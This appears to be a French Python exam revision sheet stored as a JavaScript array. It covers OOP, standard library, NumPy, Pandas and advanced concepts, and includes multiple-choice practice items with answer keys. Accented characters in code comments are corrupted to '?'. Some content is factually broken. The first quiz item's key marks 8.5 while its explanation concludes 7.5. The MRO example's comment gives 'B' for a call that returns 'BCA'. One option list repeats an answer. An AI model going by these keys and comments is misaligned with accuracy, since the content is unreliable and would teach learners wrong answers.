 9        def __sub__ ( self , other ) :      # v1 - v2
10            return Vecteur ( self . x - other .x , self . y - other . y )
12        def __mul__ ( self , scalar ) :     # v * 3
13            return Vecteur ( self . x * scalar , self . y * scalar )
15        def __eq__ ( self , other ) :       # v1 == v2
16            return self . x == other . x and self . y == other . y
18        def __lt__ ( self , other ) :           # v1 < v2 ( norme )
19            return ( self . x **2+ self . y **2) < ( other . x **2+ other . y **2)
21        def __len__ ( self ) :                       # len ( v )
22            return 2
24        def __getitem__ ( self , i ) :               # v [0] , v [1]
25            return ( self .x , self . y ) [ i ]
27        def __str__ ( self ) :
28            return f " ({ self . x } , { self . y }) "
30        def __repr__ ( self ) :
31            return f " Vecteur ({ self . x } , { self . y }) "
33   v1 = Vecteur (1 , 2)
34   v2 = Vecteur (3 , 4)
35   print ( v1 + v2 )  # (4 , 6)
36   print ( v1 == v2 ) # False`},{id:"9.3",c:9,t:"Encapsulation et propriétés",x:`➣ Syntaxe

 1   class CompteBancaire :
 2       def __init__ ( self , solde_initial ) :
 3           self . _solde = solde_initial                  # convention : prot ? g ?
 4           self . __pin = " 1234 "                        # priv ? ( name mangling )

                                                   9.3. ENCAPSULATION ET PROPRIÉTÉS

 6       @property
 7       def solde ( self ) :
 8           """ Getter """
 9           return self . _solde
11       @solde . setter
12       def solde ( self , montant ) :
13           """ Setter avec validation """
14           if montant < 0:
15                 raise ValueError ( " Le solde ne peut pas ? tre n ? gatif " )
16           self . _solde = montant
18       @solde . deleter
19       def solde ( self ) :
20           del self . _solde
22       def deposer ( self , montant ) :
23           self . _solde += montant
25   compte = CompteBancaire (1000)
26   print ( compte . solde )   # 1000 ( appelle le getter )
27   compte . solde = 2000      # appelle le setter
28   compte . solde = -500      # ValueError !
29   # compte . __pin -> AttributeError ( name mangling : _CompteBancaire__pin )

     10 | Héritage et Polymorphisme`},{id:"10.1",c:10,t:"Héritage",x:`➣ Syntaxe

 1   class Animal :
 2       def __init__ ( self , nom ) :
 3           self . nom = nom
 5        def parler ( self ) :
 6            raise NotImplementedError ( " Doit ? tre red ? finie " )
 8        def __str__ ( self ) :
 9            return f " Animal : { self . nom } "
11   class Chien ( Animal ) :
12       def __init__ ( self , nom , race ) :
13           super () . __init__ ( nom )    # appel du parent
14           self . race = race
16        def parler ( self ) :               # red ? finition ( override )
17            return f " { self . nom } dit : Ouaf ! "
19   class Chat ( Animal ) :
20       def parler ( self ) :
21           return f " { self . nom } dit : Miaou ! "
23   # Polymorphisme
24   animaux = [ Chien ( " Rex " , " Berger " ) , Chat ( " Minou " ) ]
25   for a in animaux :
26       print ( a . parler () )   # comportement diff ? rent selon le type
28   # isinstance et issubclass
29   isinstance ( Chien ( " Rex " ," B " ) , Animal )    # True
30   issubclass ( Chien , Animal )                       # True`},{id:"10.2",c:10,t:"Héritage multiple et MRO",x:`➣ Syntaxe

 1   class A :
 2       def methode ( self ) :
 3             return " A "
 5   class B ( A ) :
 6       def methode ( self ) :
 7             return " B " + super () . methode ()
 9   class C ( A ) :

                                                                       10.3. CLASSES ABSTRAITES

10         def methode ( self ) :
11             return " C " + super () . methode ()
13   class D (B , C ) :
14       pass
16   d = D ()
17   print ( d . methode () )   # " B " ( MRO : D -> B -> C -> A )
18   print ( D . __mro__ )
19   # ( < class 'D '>, < class 'B '>, < class 'C '>, < class 'A '>, ...)

     ★    Astuce Concours
     La   MRO (Method Resolution Order) suit l'algorithme C3 linearization. L'ordre est : classe
     elle-même, puis de gauche à droite les classes parentes. super() suit automatiquement la MRO.`},{id:"10.3",c:10,t:"Classes abstraites",x:`➣ Syntaxe

 1   from abc import ABC , abstractmethod
 3   class Forme ( ABC ) :
 4       @abstractmethod
 5       def aire ( self ) :
 6           pass
 8         @abstractmethod
 9         def perimetre ( self ) :
10             pass
12         def decrire ( self ) :
13             return f " Aire ={ self . aire () :.2 f } , P ={ self . perimetre () :.2 f } "
15   class Cercle ( Forme ) :
16       def __init__ ( self , r ) :
17           self . r = r
18       def aire ( self ) :
19           return 3.14159 * self . r **2
20       def perimetre ( self ) :
21           return 2 * 3.14159 * self . r
23   class Rectangle ( Forme ) :
24       def __init__ ( self , l , h ) :
25           self .l , self . h = l , h
26       def aire ( self ) :
27           return self . l * self . h
28       def perimetre ( self ) :
29           return 2*( self . l + self . h )
31   # Forme () -> TypeError : Can 't instantiate abstract class
32   c = Cercle (5)
33   print ( c . decrire () )

             Part III
Modules, Bibliothèques et Concepts

             Avancés

     11 | Modules et Packages`},{id:"11.1",c:11,t:"Importation",x:`➣ Syntaxe

 1   import math                                        #   importe le module
 2   import numpy as np                                 #   alias
 3   from os import path , getcwd                       #   importe sp ? cifiquement
 4   from math import *                                 #   tout (? ? viter en prod )
 6   # V ? rifier si un fichier est le script principal
 7   if __name__ == " __main__ " :
 8         print ( " Ex ? cution directe " )`},{id:"11.2",c:11,t:"Bibliothèque standard essentielle",x:`➣ Syntaxe

 1   # ?? math ??
 2   import math
 3   math . sqrt (16)             #   4.0
 4   math . floor (3.7)           #   3
 5   math . ceil (3.2)            #   4
 6   math . log (100 , 10)        #   2.0
 7   math . pi , math . e         #   constantes
 9   # ?? random ??
10   import random
11   random . random ()                      #    [0 , 1)
12   random . randint (1 , 10)               #    entier entre 1 et 10
13   random . choice ([1 ,2 ,3])             #    choix al ? atoire
14   random . shuffle ( lst )                #    m ? lange en place
15   random . sample ( lst , 3)              #    3 ? l ? ments sans r ? p ? tition
17   # ?? os et os . path ??
18   import os
19   os . getcwd ()                           #   r ? pertoire courant
20   os . listdir ( " . " )                   #   liste des fichiers
21   os . mkdir ( " dossier " )               #   cr ? e un dossier
22   os . path . exists ( " f . txt " )       #   existe ?
23   os . path . join ( " a " , " b . txt " )     # chemin portable
25   # ?? sys ??
26   import sys
27   sys . argv                  # arguments de ligne de commande
28   sys . exit (0)              # quitte le programme
29   sys . path                  # chemins de recherche des modules
31   # ?? datetime ??

                                                                 11.3. ITERTOOLS ET FUNCTOOLS

32   from datetime import datetime , date , timedelta
33   now = datetime . now ()
34   d = date (2024 , 1 , 15)
35   delta = timedelta ( days =30)
36   print ( now . strftime ( " % d /% m /% Y % H :% M " ) )

11.3 itertools et functools
  ➤ Exemple

 1   import itertools
 3   # Combinaisons et permutations
 4   list ( itertools . permutations ([1 ,2 ,3] , 2) )
 5   # [(1 ,2) ,(1 ,3) ,(2 ,1) ,(2 ,3) ,(3 ,1) ,(3 ,2) ]
 7   list ( itertools . combinations ([1 ,2 ,3] , 2) )
 8   # [(1 ,2) ,(1 ,3) ,(2 ,3) ]
10   list ( itertools . product ([1 ,2] ,[3 ,4]) )
11   # [(1 ,3) ,(1 ,4) ,(2 ,3) ,(2 ,4) ]
13   # Cha ? ner des it ? rables
14   list ( itertools . chain ([1 ,2] , [3 ,4] , [5]) )
15   # [1 ,2 ,3 ,4 ,5]
17   # R ? p ? ter
18   list ( itertools . repeat (0 , 5) )   # [0 ,0 ,0 ,0 ,0]
20   import functools
22   @functools . lru_cache ( maxsize =128) # m ? mo ? sation
23   def fibonacci ( n ) :
24       if n < 2: return n
25       return fibonacci (n -1) + fibonacci (n -2)
27   functools . reduce ( lambda a , b : a +b , range (1 ,6) )     # 15

     12 | NumPy – Calcul Scientifique`},{id:"12.1",c:12,t:"Tableaux NumPy",x:`❖ Définition
     NumPy est la bibliothèque fondamentale pour le calcul numérique en Python.     Elle fournit
     des tableaux   ndarray – des structures homogènes, ecaces en mémoire, avec des opérations
     vectorisées.

     ➣   Syntaxe
 1   import numpy as np
 3   #   Cr ? ation de tableaux
 4   a   = np . array ([1 , 2 , 3 , 4 , 5])
 5   b   = np . array ([[1 ,2 ,3] ,[4 ,5 ,6]])   # 2D
 6   c   = np . zeros ((3 , 4) )                # tableau de z ? ros
 7   d   = np . ones ((2 , 3) )                 # tableau de uns
 8   e   = np . eye (3)                         # matrice identit ?
 9   f   = np . arange (0 , 10 , 2)            # [0 ,2 ,4 ,6 ,8]
10   g   = np . linspace (0 , 1 , 5)           # 5 points entre 0 et 1
12   # Propri ? t ? s
13   a . shape      #   (5 ,)
14   b . shape      #   (2 , 3)
15   b . ndim       #   2
16   b . size       #   6
17   b . dtype      #   int64
19   # Redimensionnement
20   b . reshape (3 , 2) # ne modifie pas b
21   b . flatten ()      # aplatit en 1 D

     ➤   Exemple
 1   # Op ? rations vectoris ? es ( sans boucle !)
 2   a = np . array ([1 , 2 , 3 , 4])
 3   a * 2           # [2 , 4 , 6 , 8]
 4   a ** 2          # [1 , 4 , 9 , 16]
 5   a + a           # [2 , 4 , 6 , 8]
 6   np . sqrt ( a ) # [1. , 1.41 , 1.73 , 2.]
 8   # Indexation et slicing
 9   b = np . array ([[1 ,2 ,3] ,[4 ,5 ,6] ,[7 ,8 ,9]])
10   b [0 , 1]      # 2
11   b [: , 1]      # colonne 1 : [2 , 5 , 8]
12   b [1: , 1:]    # sous - matrice : [[5 ,6] ,[8 ,9]]
14   # Indexation bool ? enne ( masque )
15   a = np . array ([1 , -2 , 3 , -4 , 5])

                                                                  12.1. TABLEAUX NUMPY

16   masque = a > 0
17   a [ masque ]   # [1 , 3 , 5]
18   a [ a > 0]     # m ? me chose
19   a [ a < 0] = 0 # remplace n ? gatifs par 0
21   # Statistiques
22   np . sum ( a ) , np . mean ( a ) , np . std ( a )
23   np . min ( a ) , np . max ( a )
24   np . argmin ( a ) , np . argmax ( a )           # indices
26   # Produit matriciel
27   A = np . array ([[1 ,2] ,[3 ,4]])
28   B = np . array ([[5 ,6] ,[7 ,8]])
29   A @ B               # produit matriciel
30   np . dot (A , B ) # ? quivalent
31   A.T                 # transpos ? e
32   np . linalg . det ( A )      # d ? terminant
33   np . linalg . inv ( A )      # inverse

     13 | Pandas – Analyse de Données`},{id:"13.1",c:13,t:"Series et DataFrame",x:`➣ Syntaxe

 1   import pandas as pd
 3   # Series ( tableau 1 D index ?)
 4   s = pd . Series ([10 , 20 , 30] , index =[ " a " ," b " ," c " ])
 5   s["a"]          # 10
 6   s [ s > 15]     # filtrage
 8   # DataFrame ( tableau 2 D )
 9   df = pd . DataFrame ({
10       " nom " : [ " Ali " , " Sara " , " Omar " ] ,
11       " age " : [22 , 25 , 20] ,
12       " note " : [15.5 , 18.0 , 12.0]
13   })
15   # Acc ? s
16   df [ " nom " ]              #   colonne ( Series )
17   df [[ " nom " ," age " ]]   #   plusieurs colonnes
18   df . iloc [0]               #   premi ? re ligne ( par position )
19   df . loc [0 , " nom " ]     #   cellule sp ? cifique ( par label )
20   df . iloc [0:2 , 1:3]       #   sous - tableau par position
22   # Informations
23   df . head (3)               #   premi ? res lignes
24   df . tail (3)               #   derni ? res lignes
25   df . info ()                #   types et valeurs manquantes
26   df . describe ()            #   statistiques
27   df . shape                  #   ( lignes , colonnes )
28   df . dtypes                 #   types des colonnes

     ➤   Exemple Opérations courantes
 1   # Filtrage
 2   df [ df [ " age " ] > 21]
 3   df [( df [ " age " ] > 20) & ( df [ " note " ] >= 14) ]
 5   # Tri
 6   df . sort_values ( " note " , ascending = False )
 7   df . sort_values ([ " age " ," note " ])
 9   # Nouvelles colonnes
10   df [ " mention " ] = df [ " note " ]. apply ( lambda x : " B " if x >=14 else " P " )
12   # Groupement
13   df . groupby ( " mention " ) [ " note " ]. mean ()

                                                                      13.1. SERIES ET DATAFRAME

15   # Valeurs manquantes
16   df . isnull () . sum ()                 # compte les NaN
17   df . dropna ()                          # supprime lignes avec NaN
18   df . fillna (0)                         # remplace NaN par 0
19   df [ " note " ]. fillna ( df [ " note " ]. mean () , inplace = True )
21   # Lecture /? criture
22   df = pd . read_csv ( " data . csv " )
23   df . to_csv ( " out . csv " , index = False )
24   df = pd . read_excel ( " data . xlsx " )
25   df = pd . read_json ( " data . json " )
27   # Fusion
28   pd . merge ( df1 , df2 , on = " id " )                    # inner join
29   pd . merge ( df1 , df2 , on = " id " , how = " left " )   # left join
30   pd . concat ([ df1 , df2 ] , axis =0)                     # empilement

     14 | Concepts Avancés Importants`},{id:"14.1",c:14,t:"Compréhensions avancées",x:`➣ Syntaxe

 1   # Compr ? hension de liste avec condition if - else
 2   result = [ x **2 if x > 0 else -x for x in range ( -3 , 4) ]
 3   # [3 , 2 , 1 , 0 , 1 , 4 , 9]
 5   # Compr ? hension de dict
 6   mots = [ " Python " , " Data " , " IA " ]
 7   longueurs = { mot : len ( mot ) for mot in mots }
 9   # Compr ? hension de set
10   voyelles = { c for c in " Python est formidable " if c in " aeiou " }
12   # Aplatissement avec compr ? hension
13   matrice = [[1 ,2 ,3] ,[4 ,5 ,6] ,[7 ,8 ,9]]
14   plat = [ x for ligne in matrice for x in ligne ]
15   # [1 ,2 ,3 ,4 ,5 ,6 ,7 ,8 ,9]`},{id:"14.2",c:14,t:"Dataclasses (Python 3.7+)",x:`➣ Syntaxe

 1   from dataclasses import dataclass , field
 3   @dataclass
 4   class Etudiant :
 5       nom : str
 6       age : int
 7       notes : list = field ( default_factory = list )
 9        def moyenne ( self ) :
10            return sum ( self . notes ) / len ( self . notes ) if self . notes else 0
12   e = Etudiant ( " Ahmed " , 22 , [15 , 18 , 12])
13   print ( e )         # Etudiant ( nom = ' Ahmed ', age =22 , notes =[15 , 18 , 12])
14   print ( e . moyenne () ) # 15.0
16   # __eq__ , __repr__ g ? n ? r ? s automatiquement !`},{id:"14.3",c:14,t:"Type Hints (annotations de type)",x:`14.3. TYPE HINTS (ANNOTATIONS DE TYPE)

     ➣   Syntaxe
 1   from typing import List , Dict , Tuple , Optional , Union , Any
 3   def addition ( a : int , b : int ) -> int :
 4       return a + b
 6   def traiter ( noms : List [ str ] ,
 7                 scores : Dict [ str , float ]) -> Optional [ str ]:
 8       if not noms :
 9           return None
10       return max ( noms , key = lambda n : scores . get (n , 0) )
12   # Python 3.10+ : syntaxe simplifi ? e
13   def f ( x : int | float ) -> int | None :
14       return int ( x ) if x else None`},{id:"14.4",c:14,t:"Gestion de la mémoire et performance",x:`◆ Concept clé
     Points clés sur la mémoire Python :
          Python utilise le garbage collector (comptage de références + cycle GC)
          id(obj) retourne l'adresse mémoire de l'objet
          Les petits entiers (-5 à 256) sont internés (même objet)
          Les chaînes courtes et certaines chaînes littérales sont internées

     ☞   Attention / Piège
 1   # Partage de r ? f ? rences
 2   a = [1 , 2 , 3]
 3   b = a           # b pointe vers le m ? me objet !
 4   b . append (4)
 5   print ( a )     # [1 , 2 , 3 , 4] !!!
 7   # Pour copier :
 8   b = a . copy ()             # copie superficielle
 9   b = list ( a )              # copie superficielle
10   import copy
11   b = copy . deepcopy ( a )   # copie profonde ( pour objets imbriqu ? s )
13   #   Petit entier intern ?
14   x   = 100; y = 100
15   x   is y    # True ( m ? me objet !)
16   x   = 1000; y = 1000
17   x   is y    # False ( objets diff ? rents )`},{id:"14.5",c:14,t:"Programmation asynchrone (bases)",x:`14.5. PROGRAMMATION ASYNCHRONE (BASES)

     ➣   Syntaxe
 1   import asyncio
 3   async def tache ( nom , duree ) :
 4       print ( f " { nom } d ? marre " )
 5       await asyncio . sleep ( duree )     # ne bloque pas
 6       print ( f " { nom } termine " )
 8   async def main () :
 9       # Ex ? cution concurrente
10       await asyncio . gather (
11            tache ( " A " , 2) ,
12            tache ( " B " , 1) ,
13            tache ( " C " , 3)
14       )
16   asyncio . run ( main () )
17   # B termine , A termine , C termine

    Part IV
Examens Blancs

     15 | Examen Blanc 1 – Python Fondamental
    ★   Astuce Concours
    Conseils pour le jour du concours :
      1. Lisez tout le code avant de répondre
      2. Tracez l'exécution étape par étape mentalement
      3. Méfiez-vous des types (int, float, str, bool)
      4. Attention à l'indentation et aux objets mutables
      5. Si vous hésitez, éliminez les mauvaises réponses`},{id:"18.1",c:18,t:"Explications des codes Python",x:`18.1.1 Mutabilité et références – Concept central

     ❍   Note Comment Python gère les variables
     En Python, une variable est un   nom lié à un objet, pas une boîte contenant une valeur.
     Exemple critique :
 1   a = [1 , 2 , 3]
 2   b = a               # b pointe vers le MEME objet que a
 3   b . append (4)      # Modifie l ' objet en place
 4   print ( a )         # [1 , 2 , 3 , 4] <-- a aussi modifie !
 6   c = a [:]           # Copie superficielle ( nouvel objet )
 7   c . append (5)
 8   print ( a )         # [1 , 2 , 3 , 4]    <-- a NON modifie

     Règle : l'affectation rebinde le nom, elle ne copie pas. Pour copier : list(), [:], copy.copy()
     ou copy.deepcopy() pour les objets imbriqués.

18.1.2 Compréhensions et générateurs

     ❍   Note Lire une compréhension
 1   # Comprehension de liste : [ expression for var in iterable if condition ]
 2   carres_pairs = [ x **2 for x in range (10) if x % 2 == 0]
 3   # Equivalent a :
 4   # result = []
 5   # for x in range (10) :
 6   #     if x % 2 == 0:
 7   #         result . append ( x **2)
 9   # Generateur ( lazy , memoire constante ) :
10   gen = ( x **2 for x in range (10) ) # Parentheses au lieu de crochets

     Lecture : d'abord l'expression de sortie, puis la boucle, puis le filtre. Un générateur ne calcule
     les valeurs qu'à la demande (lazy evaluation) et ne peut être consommé qu'   une seule fois.

18.1.3 Portée des variables (LEGB)
     ❍   Note Règle LEGB
     Python cherche les variables dans l'ordre :   Local → Englobante → Global → Builtins.
 1   x = 10               # Global
 2   def f () :
 3       x = 20           # Local a f

                                                        18.2. DÉFINITIONS PYTHON À MÉMORISER

 4          def g () :
 5               nonlocal x   # Refere a x de f ( pas la globale )
 6               x = 30
 7          g ()
 8          print ( x )  # 30 ( modifie par nonlocal dans g )
 9   f ()
10   print ( x )            # 10 ( la globale n 'a pas change )

     Règles :
         Sans global ou nonlocal, une affectation crée une variable locale.
         global x : utilise la variable globale.
         nonlocal x : utilise la variable de la fonction englobante.`},{id:"18.2",c:18,t:"Définitions Python à mémoriser",x:`❖ Définition Glossaire Python
     p3.5cmp12cm
     Terme Définition

     Interprété    Code exécuté ligne par ligne (pas de compilation explicite).
     Typage dynamique Le type est attaché à l'     objet, pas au nom. Déterminé à l'exécution.
     Duck typing     «Si ça marche comme un canard...» – on vérifie le comportement, pas le type.

     Mutable Modifiable en place : list, dict, set.
     Immuable      Non modifiable : int, float, str, tuple, frozenset.

     Itérable Objet parcourable (for     x in iterable).
     Itérateur Objet avec __next__(). Épuisable (une seule passe).
     Générateur Fonction avec yield. Produit les valeurs à la demande (lazy).
     Décorateur Fonction qui modifie une autre fonction : @decorator.

     Héritage Spécialiser une classe. Héritage   multiple possible en Python.
     MRO     Ordre de résolution des méthodes (C3 linearization).
     self Référence à l'instance courante. Premier paramètre obligatoire des méthodes.
     cls Référence à la classe. Premier paramètre des @classmethod.
     __init__ Constructeur (initialiseur). Appelé après la création de l'objet.`},{id:"18.3",c:18,t:"Règles fondamentales à mémoriser",x:`★ Astuce Concours 25 règles d'or Python
       1. // = division entière, / = division réelle, % = modulo, ** = puissance.
       2. Valeurs falsy : 0, 0.0, "", [], {}, set(), None, False.
       3. bool est sous-classe de int : True==1, False==0.
       4. is compare les identités (même objet), == compare les valeurs.
       5. L'affectation    rebinde le nom, elle ne copie pas l'objet.
       6.   for/else : le else s'exécute seulement si pas de break.
       7. Générateurs :    lazy, consomment peu de mémoire, une seule passe.
       8. MRO : gauche à droite, puis parents (C3 linearization).
       9.   set/dict lookup = O(1). Liste lookup = O(n).

                                                       18.4. PIÈGES FRÉQUENTS AU CONCOURS

   10.   sorted() et list.sort() utilisent Timsort = O(n log n).
   11. Ne   jamais utiliser un objet mutable comme valeur par défaut d'un paramètre.
   12.   __str__ : pour l'utilisateur (print). __repr__ : pour le développeur.
   13. Tout est objet en Python (même les fonctions et les classes).
   14. @property : transforme une méthode en attribut (getter/setter propre).
   15. @staticmethod : pas d'accès à self ni cls. @classmethod : accès à cls.
   16. with (context manager) garantit la libération des ressources (__enter__/__exit__).
   17. Les chaînes sont   immuables. La concaténation en boucle crée de nouveaux objets.
   18. try/except/else/finally : else s'exécute si aucune exception.
   19. Attraper des exceptions précises, jamais un except: nu (masque les erreurs).
   20. *args : tuple de positionnels. **kwargs : dict de nommés.
   21. list.append() est O(1) amorti. list.insert(0, x) est O(n).
   22. Un dict garde l'ordre d'insertion depuis Python 3.7+.
   23. enumerate() donne index + valeur. zip() combine des itérables.
   24. Les f-strings f"..." sont plus rapides que % ou .format().
   25. __slots__ : économise la mémoire en fixant les attributs d'une classe.`},{id:"18.4",c:18,t:"Pièges fréquents au concours",x:`☞ Attention / Piège 15 pièges classiques Python
    1. Paramètre par défaut mutable : def   f(lst=[]) ⇒ la liste est partagée entre les appels !
    2. a = b = [1,2] : les deux noms pointent vers le même objet.
    3. is vs == : a = [1]; b = [1]; a == b est True, a is b est False.
    4. range(5) va de 0 à 4 (5 exclu).
    5. Modifier une liste pendant un for ⇒ comportement imprévisible.
    6. int/str/tuple sont immuables : les opérations créent de nouveaux objets.
    7. global x dans une fonction : sinon l'affectation crée une variable locale.
    8. Division : 7/2 = 3.5 (réel), 7//2 = 3 (entier).
    9. -7//2 = -4 (arrondi vers le bas), pas -3.
   10. except Exception attrape presque tout.      except BaseException attrape tout (même
       KeyboardInterrupt).
   11. Un générateur épuisé ne peut pas être réutilisé.
   12.   dict[key] lève KeyError si la clé n'existe pas. Utiliser .get(key, default).
   13.   import ne re-charge pas un module déjà importé.
   14. Les closures capturent la   variable, pas sa valeur au moment de la création.
   15.   super() en héritage multiple suit la MRO, pas forcément la «classe parente directe».

PROGRAMMATION WEB
             Fiche de Révision Complète

 Contenu : Architecture Web, HTML5, CSS3, Flexbox/Grid,
          JavaScript (ES6+), DOM, AJAX/Fetch,
     PHP 8, Bases de données (PDO), Laravel (MVC),
    Astuces Concours & 2 Examens Blancs (70 questions)

                        2025/2026`}],ah=[{q:`Quelle est la valeur de x après l'exécution du code suivant ?

1   x = 7 / 2 + 7 // 2 + 7 % 2`,o:["7.0","7.5","8.5","6.5"],a:2,e:"Réponse : C) 8.5 7 / 2 = 3.5 (division réelle), 7 // 2 = 3 (division entière), 7 % 2 = 1 (modulo). x = 3.5 + 3 + 1 = 7.5... Attendez : 3.5 + 3 = 6.5, 6.5 + 1 = 7.5. Correction : La réponse correcte est 7.5 (B). Les autres options sont incorrectes car :  A (7.0) : oublie le modulo  C (8.5) : ajoute un de trop  D (6.5) : oublie le modulo Réponse finale : B) 7.5"},{q:`Quelle est la sortie du code suivant ?

1   lst = [10 , 20 , 30 , 40 , 50]
2   print ( lst [1: -1:2])`,o:["[20, 40]","[20, 30, 40]","[20, 40, 50]","[20]"],a:0,e:"Réponse : A) [20, 40] lst[1:-1:2] : début=1, fin=-1 (index 4, exclu), pas=2. Éléments pris : index 1 (20), index 3 (40). Résultat : [20, 40].  B : lst[1:-1] sans le pas donnerait [20,30,40]  C : dépasse la borne (50 à index 4 est exclu)  D : seulement si pas=3"},{q:`Quelle est la sortie ?

1   a = [1 , 2 , 3]
2   b = a
3   b . append (4)
4   b = [5 , 6]
5   print ( a )`,o:["[1, 2, 3]","[1, 2, 3, 4]","[5, 6]","[1, 2, 3, 4, 5, 6]"],a:1,e:"Réponse : B) [1, 2, 3, 4] 1. a = [1,2,3], b = a : b et a pointent vers le même objet. 2. b.append(4) : modifie l'objet partagé ? a devient [1,2,3,4]. 3. b= [5,6] : b pointe vers un nouvel objet. a n'est pas affecté. 4. print(a) ? [1,2,3,4]. Distinction cruciale : b.append() modifie l'objet en place, b = [5,6] rebind la référence."},{q:`Quelle est la sortie ?

1   def f (* args , ** kwargs ) :
2       return len ( args ) + len ( kwargs )
4   print ( f (1 , 2 , 3 , a =4 , b =5) )`,o:["3","2","5","7"],a:2,e:'Réponse : C) 5 args = (1, 2, 3) ? len(args) = 3 kwargs = {"a": 4, "b": 5} ? len(kwargs) = 2 3 + 2 = 5 A (3) : oublie kwargs. B (2) : oublie args. D (7) : compte les valeurs au lieu des clés.'},{q:"Laquelle de ces expressions vaut False en Python ?",o:["bool(0.1)",'bool("False")',"bool([])","bool((0,))"],a:2,e:`Réponse : C) bool([]) Valeurs falsy en Python : 0, 0.0, "", [], {}, set(), None, False.  A : 0.1 est non-zéro ? True  B : "False" est une chaîne non-vide ? True  C : [] est une liste vide ? False ?  D : (0,) est un tuple non-vide ? True (même s'il contient 0 !)`},{q:`Quelle est la valeur de result ?

1   result = [ x for x in range (10) if x % 2 == 0 if x % 3 == 0]`,o:["[0, 2, 4, 6, 8]","[0, 6]","[0, 3, 6, 9]","[6]"],a:1,e:"Réponse : B) [0, 6] La compréhension applique deux conditions : divisible par 2 ET par 3 (équivaut à divisible par 6). Parmi 0..9 : 0 (0%6=0 ?) et 6 (6%6=0 ?). Résultat : [0, 6].  A : seulement divisible par 2  C : seulement divisible par 3  D : exclut 0 à tort (0 est divisible par tout)"},{q:`Que se passe-t-il lors de l'exécution ?

1   d = { " a " : 1 , " b " : 2 , " a " : 3}
2   print ( len ( d ) , d [ " a " ])`,o:["3 1","2 3","3 3","2 1"],a:1,e:`Réponse : B) 2 3 En Python, les clés d'un dictionnaire sont uniques. Si une clé est répétée, la dernière valeur gagne. Le dict final est {"a": 3, "b": 2} ? len = 2, d["a"] = 3.`},{q:`Quelle est la sortie ?

 1   class A :
 2       def methode ( self ) :
 3             return " A "
 5   class B ( A ) :
 6       def methode ( self ) :
 7             return " B " + super () . methode ()
 9   class C ( A ) :
10       def methode ( self ) :
11             return " C " + super () . methode ()
13   class D (B , C ) :
14       pass
16   print ( D () . methode () )`,o:['"BA"','"BCA"','"BCA"','"CA"'],a:1,e:'Réponse : B) "BCA" MRO de D : D ? B ? C ? A. D().methode() appelle B.methode() : "B" + super().methode() super() dans B suit la MRO ? appelle C.methode() : "C" + super().methode() super() dans C ? appelle A.methode() : "A" Résultat : "B" + "C" + "A" = "BCA"'},{q:`Quelle est la sortie ?

 1   def gen () :
 2       for i in range (3) :
 3            yield i * 2
 5   g = gen ()
 6   print ( next ( g ) )
 7   print ( next ( g ) )
 8   list ( g )
 9   print ( next ( g ) )`,o:["0, 2, [4]","0, 2 puis StopIteration","0, 2 puis [4] puis StopIteration","0, 2, 4"],a:2,e:"Réponse : C) 0, 2 puis [4] puis StopIteration 1. next(g) ? 0 (i=0, yield 0) 2. next(g) ? 2 (i=1, yield 2) 3. list(g) ? [4] (consomme le reste : i=2, yield 4) 4. next(g) ? StopIteration (générateur épuisé) Un générateur ne peut être parcouru qu'une seule fois !"},{q:`Quelle est la sortie ?

 1   def double ( f ) :
 2       def wrapper ( x ) :
 3           return f ( x ) * 2
 4       return wrapper
 6   def increment ( f ) :
 7       def wrapper ( x ) :
 8           return f ( x ) + 1
 9       return wrapper
11   @increment
12   @double
13   def valeur ( x ) :
14       return x
16   print ( valeur (5) )`,o:["10","11","12","6"],a:1,e:"Réponse : B) 11 Les décorateurs s'appliquent de bas en haut : d'abord double, puis increment. valeur = increment(double(valeur)) Appel de valeur(5) : 1. increment.wrapper(5) est appelé 2. Il appelle double.wrapper(5) 3. double.wrapper appelle valeur_original(5) = 5, puis 5*2 = 10 4. increment.wrapper retourne 10 + 1 = 11"},{q:`Quelle est la sortie ?

 1   try :
 2       x = 1 / 0
 3   except ZeroDivisionError :




 4        print ( " A " )
 5   except Exception :
 6        print ( " B " )
 7   else :
 8        print ( " C " )
 9   finally :
10        print ( " D " )`,o:["A, D","B, D","A, C, D","A"],a:0,e:`Réponse : A) A, D  1/0 lève ZeroDivisionError ? print("A")  except Exception ne s'exécute pas (déjè capturé)  else ne s'exécute PAS (il y a eu une exception)  finally s'exécute toujours ? print("D")`},{q:`Quelle est la valeur de result ?

 1   lst = [1 , 2 , 3 , 4 , 5]
 2   result = list ( map ( lambda x : x **2 if x %2 else x //2 , lst ) )`,o:["[1, 4, 9, 16, 25]","[1, 1, 9, 2, 25]","[1, 1, 3, 2, 5]","[1, 2, 9, 4, 25]"],a:1,e:"Réponse : B) [1, 1, 9, 2, 25] La lambda : si x%2 est truthy (impair) ? x**2, sinon (pair) ? x//2.  1 (impair) ? 1^2 = 1  2 (pair) ? 2//2 = 1  3 (impair) ? 3^2 = 9  4 (pair) ? 4//2 = 2  5 (impair) ? 5^2 = 25 Résultat : [1, 1, 9, 2, 25]"},{q:`Quelle est la sortie ?

 1   a , *b , c = [1 , 2 , 3 , 4 , 5]
 2   print (a , b , c )`,o:["1 [2, 3, 4] 5","1 (2, 3, 4) 5","1 2 5","Erreur de syntaxe"],a:0,e:"Réponse : A) 1 [2, 3, 4] 5 L'opérateur *b (extended unpacking) capture tout ce qui reste entre a et c sous forme de liste (pas de tuple). a=1, b=[2,3,4], c=5 B : b est une liste, pas un tuple. C : b manque les éléments du milieu."},{q:`Quelle est la sortie ?

1   for i in range (5) :
2        if i == 3:
3              break
4   else :
5        print ( " termin ? " )
6   print ( " fin " , i )`,o:["terminé\\nfin 4","fin 3","terminé\\nfin 3","fin 4"],a:1,e:`Réponse : B) fin 3 La boucle s'arrête avec break quand i=3. Le bloc else ne s'exécute pas (car il y a eu un break). i vaut 3 au moment du break ? print("fin", i) ache fin 3.`},{q:`Quelle est la sortie ?

1   def creer () :
2       fns = []
3       for i in range (3) :
4           fns . append ( lambda : i )
5       return fns
7   fns = creer ()
8   print ([ f () for f in fns ])`,o:["[0, 1, 2]","[2, 2, 2]","[0, 0, 0]","Erreur"],a:1,e:"Réponse : B) [2, 2, 2] Piège classique des closures ! Les lambdas capturent la référence à i, pas sa valeur au moment de la création. Quand elles sont appelées, i vaut 2 (valeur finale après la boucle). Solution : capturer la valeur avec un argument par défaut : 1 fns . append ( lambda i = i : i ) # capture la valeur"},{q:`Quelle est la sortie ?

 1   class Compteur :
 2       n = 0
 3       def __init__ ( self ) :
 4           Compteur . n += 1
 5           self . id = Compteur . n
 7   c1 = Compteur ()
 8   c2 = Compteur ()
 9   c3 = Compteur ()
